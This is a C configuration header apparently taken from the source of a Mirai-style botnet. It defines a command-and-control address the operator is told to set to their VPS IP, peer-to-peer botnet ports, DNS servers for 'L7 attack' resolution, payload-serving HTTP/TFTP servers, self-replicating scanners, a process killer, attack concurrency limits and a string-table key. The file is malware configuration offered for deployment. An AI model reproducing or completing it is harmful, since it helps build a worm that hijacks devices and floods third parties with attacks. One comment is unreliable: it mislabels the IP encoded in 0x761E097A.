#ifndef _CONFIG_H
#define _CONFIG_H

/* CNC server (change to your VPS IP) */
#define CNC_ADDR "0.0.0.0"

/* P2P configuration - torrent-style networking */
#define P2P_PORT 49152
#define P2P_FILE_PORT 49153
#define P2P_MAX_PEERS 256
#define P2P_PING_INTERVAL 30
#define P2P_PEER_TIMEOUT 120
#define P2P_SEEDS ""

/* DNS servers for L7 attack domain resolution (rotated randomly) */
#define DNS_SERVER_1  0x01010101  /* 1.1.1.1 - Cloudflare */
#define DNS_SERVER_2  0x08080808  /* 8.8.8.8 - Google */
#define DNS_SERVER_3  0x08080404  /* 8.8.4.4 - Google secondary */
#define DNS_SERVER_4  0x09090909  /* 9.9.9.9 - Quad9 */
#define DNS_SERVER_5  0x01000001  /* 1.0.0.1 - Cloudflare secondary */
#define DNS_SERVER_6  0x761E097A  /* 118.118.9.122 - China fallback */
#define DNS_SERVER_7  0x80808080  /* 128.128.128.128 - General fallback */

/* Scan callback port */
#define SCAN_CB_PORT 9555

/* Server configuration */
#define HTTP_SERVER "0.0.0.0"
#define HTTP_SERVER_IP "0.0.0.0"
#define HTTP_PORT 80
#define TFTP_SERVER "0.0.0.0"
#define SINGLE_INSTANCE_PORT 23455

/* Feature flags */
#define KILLER
#define SELFREP          /* Enable self-replication scanners */
//#define WATCHDOG

/* Performance tuning */
#define ATTACK_CONCURRENT_MAX 15
#define SCAN_RAW_PPS 384
#define SCANNER_MAX_CONNS 256
#define KILLER_MIN_PID 400
#define KILLER_RESTART_SCAN_TIME 3600
#define TABLE_KEY 0xdeadbeef

#endif
